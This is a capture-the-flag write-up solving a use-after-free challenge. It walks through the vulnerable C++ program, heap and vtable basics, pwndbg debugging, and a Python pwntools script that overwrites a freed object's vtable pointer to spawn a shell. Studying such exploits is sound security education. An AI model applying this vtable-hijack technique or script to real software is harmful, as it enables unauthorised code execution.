# UAF
use after free!
this one was hard asf.
for this challenge I used `pwndbg` which is an expansion to the regular `GDB`.
**Download `PWNDBG` [here](https://github.com/pwndbg/pwndbg)**
## Source Code:
```CPP
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```
OK, let's break down.
- the program creating a new `Man` and a new `Woman` objects. (allocated on the heap)
- then allowing us to:
	- call `introduce` on both
	- allocate data from a file on the heap (takes a size, and file to read from as arguments)
	- free the `M` and `W` objects

this looks like it is going to be a `Use-After-Free` challenge.
I don't know anything about heap exploitation. so let's do some research!

## HEAP
The `heap` is a region of memory in a computer system where dynamically allocated memory is managed. Unlike the `stack`, where memory is allocated and de-allocated automatically with a function call, memory allocated in the heap persists until it's explicitly freed by the programmer.
### heap chunks
the heap is allocating memory using chunks, the chunks is separated to 2:
- actual user data - minimum of 24 bytes
- metadata - minimum of 8 bytes
So minimum chunk size is 32 bytes.
### heap allocation
When we use “free” to de-allocate a chunk, the heap will reuse the chunk for other data that we use.

## Use-After-Free
If the program is using an already freed chunk, it could crash. If we can control the freed buffer we can use this chunk or even overwrite some data into the chunk and use it.

This should be enough to cover this challenge. let's go!

## Debugging.
Let's start by running the program.
We can make the program:
- call `introduce` on `M`, `W`
- free `M`,`W`
- call `introduce` on `M`, `W`
```sh
# 1. use
# 2. after
# 3. free
1
# My name is Jack
# I am 25 years old
# I am a nice guy!
# My name is Jill
# I am 21 years old
# I am a cute girl!
# 1. use
# 2. after
# 3. free
3
# 1. use
# 2. after
# 3. free
1
# [2]    30973 segmentation fault  ./uaf
```
And we get a `segmentation fault` - looks like we are on the right track! remember we can also set data using `2`.
open the program with `pwndbg` (which adding it self to `gdb`)
```sh
gdb ./uaf
set pagination off # turn off pagination
set disassembly-flavor intel # change to intel syntax
set print asm-demangle on # to show functions names
disass main
```
The code is huge, so let's take it slow:
![[Pasted image 20241018064949.png]]
Let's set a break point on the creation of `Man` - `0x0000000000400f13`
```sh
break *0x0000000000400f13
```
and run the program
```
r
```
And we got to the `breakpoint`:
![[Pasted image 20241018065226.png]]
Nice! we can use the `vis` command to check the heap!
```sh
vis
```

![[Pasted image 20241018065341.png]]
And we can see the word `Jack` which means we see the bytes of the object `M`!
let's press `n` and `vis` again:
![[Pasted image 20241018065516.png]]
Looks like another chunk was added! let's see what is on that chunk!
```sh
x/10x *0x0000000000401570
```
![[Pasted image 20241018065611.png]]
Looks like the address to `Human`? looks like it shows all the virtual functions of the object...
```cpp
virtual void give_shell()
virtual void introduce()
```
let's do some research!
![[Pasted image 20241018065931.png]]
## `VTABLE`s
I don't want to waste a lot of time explaining this, but basically it is a table just like the `GOT` which contains mapping for virtual function to the address. when you invoke a virtual method on an object, this happens:
- the program checks the `vtable`
- looking for the offset of the function inside the `vtable`
	- you can see that `Human::introduce()` is @ `+8` and `Human::give_shell()` is @ `+16`
- calling the address at the table

Cool! So if we can change the offsets of the table, we can call `get_shell` when `introduce` is called!
Because `Human::introduce()` is `vtable + 8` and `Human::give_shell()` is `vtable + 16` we can take the table 8 bytes back.
So when the `Human::introduce()` is called, it will actually call `Human::give_shell()`.

## Back to debugging.
As we know, if something is freed - the program will use the already created chunk in another situation.
Let's do a test.
```sh
python -c 'print "A"*24' > /tmp/a
gdb ./uaf
break *0x0000000000401067 # this address is right before the cout (after allocating)
r 24 /tmp/a
```
we can now do:
```
3
2
c
2
```
**notice that we need to fill the buffer twice**
We hit the `breakpoint`! let's run `vis`:
![[Pasted image 20241018072026.png]]
looking on the same offsets, we now have `AAAAA` where the address to the `vtable` was!
Amazing!
## Exploit
We can now use python to calculate the new address:
```python
import pwn
real_table = 0x0000000000401570
new_table = real_table - 8
addr = pwn.p64(new_table)
b'h\x15@\x00\x00\x00\x00\x00'
```
Remember we need to fill to 24 bytes, our address is 8 bytes (including the null bytes) so we need `16` more bytes.
```python
import pwn
import sys

real_table = 0x0000000000401570
new_table = real_table - 8
addr = pwn.p64(new_table)
filler = b'a'*16
payload = addr + filler

sys.stdout.buffer.write(payload)
```
save it as `payload.py` and run:
```bash
python3 payload.py > /tmp/a
```
To get the file ready.

And to exploit:
![[Pasted image 20241018073127.png]]
And we got a shell.
Let's develop an exploit script.
## Exploitation script
The server has only `python2`:
```python
import pwn

def generate_payload():
	real_table = 0x0000000000401570
	new_table = real_table - 8
	addr = pwn.p64(new_table)
	filler = 'a'*16
	payload = addr + filler
	return payload

def execute(filename):
	elf = pwn.context.binary = pwn.ELF("./uaf")
	p = elf.process(['24' , filename])
	p.recvuntil("free")
	p.sendline("3")
	pwn.log.info("Freed 2 chunks")

	p.recvuntil("free")
	p.sendline("2")
	p.recvuntil("free")
	p.sendline("2")

	pwn.log.info("Changed memory")

	p.recvuntil("free")
	p.sendline("1")

	pwn.log.info("Use-After-Free triggerd! Enjoy the shell")
	p.interactive()

def main():
	filename = "/tmp/a"
	f=open(filename, "wb")
	payload = generate_payload()
	f.write(payload)
	f.close()
	execute(filename)


if __name__ == "__main__":
	main()
```

![[Pasted image 20241018075307.png]]

Good Game!